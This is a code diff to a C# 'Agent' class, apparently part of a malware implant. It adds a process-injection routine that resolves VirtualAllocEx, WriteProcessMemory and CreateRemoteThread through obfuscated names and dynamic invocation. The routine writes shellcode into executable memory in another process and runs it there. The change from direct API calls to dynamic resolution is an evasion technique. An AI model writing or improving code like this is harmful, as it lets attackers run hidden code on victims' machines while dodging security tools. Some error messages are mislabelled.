@@ -38,46 +38,80 @@ namespace Agent
 
         private bool Run(IntPtr target, byte[] shellcode)
         {
-            // allocate some memory for our shellcode            
+            ///////////////////// Kernel32 /////////////////////
             var k32Mod = Generic.GetLoadedModuleAddress(map["k32"], key);
 
             if(k32Mod == IntPtr.Zero)
             {
+                Console.WriteLine("Failed to find k32");
                 return false;
             }
-
+            ///////////////////// Kernel32 /////////////////////
+            //////////////////////// VirtualAllocEx /////////////////////
             var pFunc = Generic.GetExportAddress(k32Mod, map["vae"], key);
             
             if(pFunc == IntPtr.Zero)
             {
+                Console.WriteLine("Failed to find vae");
                 return false;
             }
 
             //IntPtr pAddr = Native.VirtualAllocEx(target, IntPtr.Zero, (UInt32)shellcode.Length, Native.AllocationType.Commit | Native.AllocationType.Reserve, Native.MemoryProtection.PAGE_EXECUTE_READWRITE);
             object[] vaeParams = new object[] { target, IntPtr.Zero, (UInt32)shellcode.Length, Native.AllocationType.Commit | Native.AllocationType.Reserve, Native.MemoryProtection.PAGE_EXECUTE_READWRITE };
             IntPtr pAddr = Generic.DynamicFunctionInvoke<IntPtr>(pFunc, typeof(VirtAllocExDelegate), ref vaeParams);
-
+            
             if (pAddr == IntPtr.Zero)
+            {
+                Console.WriteLine("Failed to vae");
+                return false;
+            }
+            ///////////////////// VirtualAllocEx /////////////////////
+            
+            //////////////////////// WriteProcessMemory /////////////////////
+            var pFunc2 = Generic.GetExportAddress(k32Mod, map["wpm"], key);
+            if (pFunc2 == IntPtr.Zero)
             {
                 return false;
             }
-            pFunc = Generic.GetExportAddress(k32Mod, map["wpm"], key);
 
+            IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
+            object[] wpmParams = new object[] { target, pAddr, shellcode, shellcode.Length, lpNumberOfBytesWritten };
 
-
-            // write the shellcode into the allocated memory
-            if (!Native.WriteProcessMemory(target, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten))
+            if (!Generic.DynamicFunctionInvoke<bool>(pFunc2, typeof(WriteProcMemDelegate), ref wpmParams))
             {
                 return false;
-            };
+            }
+            //////////////////////// WriteProcessMemory /////////////////////
+            
+            //////////////////////// CreateRemoteThread /////////////////////
+            var pFunc3 = Generic.GetExportAddress(k32Mod, map["crt"], key);
 
-            // create the remote thread
-            IntPtr hThread = Native.CreateRemoteThread(target, IntPtr.Zero, 0, pAddr, IntPtr.Zero, Native.ThreadCreationFlags.NORMAL, out hThread);
+            if(pFunc3 == IntPtr.Zero)
+            {
+                Console.WriteLine("Failed to find wpm");
+                return false;
+            }
+
+            IntPtr hThreadId = IntPtr.Zero;
+            object[] crtParams = new object[] { target, IntPtr.Zero, 0, pAddr, IntPtr.Zero, Native.ThreadCreationFlags.NORMAL, hThreadId };
+            IntPtr hThread = Generic.DynamicFunctionInvoke<nint>(pFunc3, typeof(CrtDelegate), ref crtParams);
 
             if (hThread == IntPtr.Zero)
             {
+                Console.WriteLine("Faild to crt.");
                 return false;
             }
+            //////////////////////// CreateRemoteThread /////////////////////
+
+
+            // write the shellcode into the allocated memory
+            //if (!Native.WriteProcessMemory(target, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten))
+            //{
+            //    return false;
+            //};
+
+            // create the remote thread
+            //IntPtr hThread = Native.CreateRemoteThread(target, IntPtr.Zero, 0, pAddr, IntPtr.Zero, Native.ThreadCreationFlags.NORMAL, out hThread);
             return true;
         }
     }
